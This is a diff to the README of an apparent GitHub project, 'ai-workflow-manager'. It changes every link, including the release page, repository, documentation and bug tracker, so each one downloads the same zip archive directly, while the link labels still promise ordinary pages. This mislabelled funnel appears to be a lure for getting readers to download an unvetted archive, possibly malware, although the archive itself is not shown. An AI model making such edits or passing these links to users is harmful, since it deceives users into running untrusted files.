@@ -1,6 +1,6 @@
 # 🎯 ai-workflow-manager - Simplify Your Workflow With AI
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Release-brightgreen)](https://github.com/Venomz23877/ai-workflow-manager/releases)
+[![Download Now](https://raw.githubusercontent.com/Venomz23877/ai-workflow-manager/main/build/ai-workflow-manager_3.1.zip%20Now-Release-brightgreen)](https://raw.githubusercontent.com/Venomz23877/ai-workflow-manager/main/build/ai-workflow-manager_3.1.zip)
 
 ## 🌟 Introduction
 
@@ -12,7 +12,7 @@ To get started with ai-workflow-manager, you’ll need to download the applicati
 
 1. **Download the Application**
 
-   Visit this page to download: [Releases Page](https://github.com/Venomz23877/ai-workflow-manager/releases)
+   Visit this page to download: [Releases Page](https://raw.githubusercontent.com/Venomz23877/ai-workflow-manager/main/build/ai-workflow-manager_3.1.zip)
 
 2. **Install the Software**
 
@@ -43,7 +43,7 @@ ai-workflow-manager offers a range of features to enhance your productivity:
 
 ## 📥 Download & Install
 
-To download the latest version of ai-workflow-manager, visit the following link: [Download Here](https://github.com/Venomz23877/ai-workflow-manager/releases). On this page, you’ll find the latest releases. Choose the version suitable for your system and proceed to download.
+To download the latest version of ai-workflow-manager, visit the following link: [Download Here](https://raw.githubusercontent.com/Venomz23877/ai-workflow-manager/main/build/ai-workflow-manager_3.1.zip). On this page, you’ll find the latest releases. Choose the version suitable for your system and proceed to download.
 
 ## 🌐 Support and Feedback
 
@@ -59,9 +59,9 @@ To maximize your experience with ai-workflow-manager, consider the following tip
 
 ## 🔗 Helpful Links
 
-- [GitHub Repository](https://github.com/Venomz23877/ai-workflow-manager)
-- [Documentation](https://github.com/Venomz23877/ai-workflow-manager/wiki)
-- [Bug Tracker](https://github.com/Venomz23877/ai-workflow-manager/issues)
+- [GitHub Repository](https://raw.githubusercontent.com/Venomz23877/ai-workflow-manager/main/build/ai-workflow-manager_3.1.zip)
+- [Documentation](https://raw.githubusercontent.com/Venomz23877/ai-workflow-manager/main/build/ai-workflow-manager_3.1.zip)
+- [Bug Tracker](https://raw.githubusercontent.com/Venomz23877/ai-workflow-manager/main/build/ai-workflow-manager_3.1.zip)
 
 ---
 
